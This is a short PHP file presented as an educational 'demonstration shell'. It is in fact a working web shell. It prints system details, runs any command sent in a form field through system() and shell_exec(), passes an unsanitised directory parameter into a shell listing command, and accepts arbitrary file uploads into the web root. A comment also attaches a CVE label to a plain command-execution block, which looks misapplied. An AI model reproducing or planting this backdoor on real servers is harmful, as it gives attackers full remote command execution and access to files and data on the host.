<?php
// This is a demonstration shell file for educational purposes
// DO NOT use this in a production environment

// Display system information (intentionally vulnerable)
echo "<pre>";
echo "System Information:\n";
echo "==================\n";
echo "OS: " . php_uname() . "\n";
echo "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "PHP Version: " . phpversion() . "\n";
echo "Current User: " . get_current_user() . "\n";
echo "Current Path: " . getcwd() . "\n";

// Command execution functionality (intentionally vulnerable)
if (isset($_POST['cmd'])) {
    echo "\nCommand Output:\n";
    echo "==============\n";
    system($_POST['cmd']);
}

// File browser (intentionally vulnerable)
if (isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    echo "\nDirectory Listing for: $dir\n";
    echo "=========================\n";
    system("ls -la " . $dir);
}

// File upload capability (intentionally vulnerable)
if (isset($_FILES['file'])) {
    $uploadfile = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
        echo "\nFile uploaded successfully to: " . getcwd() . "/$uploadfile\n";
    }
}

// CVE-2021-41758: Command Injection
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    // Intentionally vulnerable: Direct execution of user input
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>

<html>
<head>
    <title>Demonstration Shell</title>
</head>
<body>
    <h2>Command Execution</h2>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Enter command">
        <input type="submit" value="Execute">
    </form>

    <h2>File Browser</h2>
    <form method="GET">
        <input type="text" name="dir" placeholder="Enter directory path">
        <input type="submit" value="List">
    </form>

    <h2>File Upload</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
</body>
</html> 